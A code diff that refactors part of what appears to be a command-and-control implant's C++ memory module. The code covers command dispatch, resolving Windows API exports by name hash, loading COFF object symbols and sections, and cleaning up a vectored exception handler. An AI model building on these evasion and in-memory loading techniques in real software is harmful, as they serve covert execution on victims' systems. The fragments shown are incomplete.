@@ -127,7 +127,6 @@ namespace Memory {
                 free(heap, 0, Ctx);
             }
         }
-
     }
 
 
@@ -168,13 +167,13 @@ namespace Memory {
                 const auto funcs    = RVA(uint32_t*, base, exports->AddressOfFunctions);
                 const auto names    = RVA(uint32_t*, base, exports->AddressOfNames);
 
-                for (auto i = 0; i < exports->NumberOfNames; i++) {
-                    const auto name = RVA(char*, base, names[i]);
+                for (auto name_index = 0; name_index < exports->NumberOfNames; name_index++) {
+                    const auto name = RVA(char*, base, names[name_index]);
 
                     x_memset(lowercase, 0, MAX_PATH);
 
                     if (hash - Utils::GetHashFromStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
-                        address = R_CAST(FARPROC, RVA(PULONG, base, funcs[ords[i]]));
+                        address = R_CAST(FARPROC, RVA(PULONG, base, funcs[ords[name_index]]));
                         break;
                     }
                 }
@@ -270,10 +269,9 @@ namespace Memory {
         BOOL ExecuteCommand(_parser &parser) {
             HEXANE
 
+            const auto  cmd_id      = Parser::UnpackDword(&parser);
             _command    cmd         = { };
             uintptr_t   address     = { };
-
-            const auto  cmd_id      = Parser::UnpackDword(&parser);
             bool        success     = true;
 
             if (cmd_id == NOJOB) {
@@ -354,7 +352,6 @@ namespace Memory {
             for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
                 if (object->symbol[sym_index].First.Value[0]) {
                     symbol_name = object->symbol[sym_index].First.Name;
-
                 } else {
                     symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols + object->symbol[sym_index].First.Value[1]);
                 }
@@ -368,10 +365,11 @@ namespace Memory {
                 }
             }
 
-            for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
-                if (U_PTR(exec) >= U_PTR(object->sec_map[sec_index].address) && U_PTR(exec) < U_PTR(object->sec_map[sec_index].address) + object->sec_map[sec_index].size) {
-                    object->section = SECTION_HEADER(object->buffer, sec_index);
 
+            for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
+                if (U_PTR(exec) >= SEC_START(object->sec_map, sec_index) && U_PTR(exec) < SEC_END(object->sec_map, sec_index)) {
+
+                    object->section = SECTION_HEADER(object->buffer, sec_index);
                     if ((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {
                         success = true;
                     }
@@ -387,10 +385,7 @@ namespace Memory {
             }
 
             defer:
-            if (veh_handler) {
-                Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler);
-            }
-
+            if (veh_handler) { Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler); }
             return success;
         }
     }
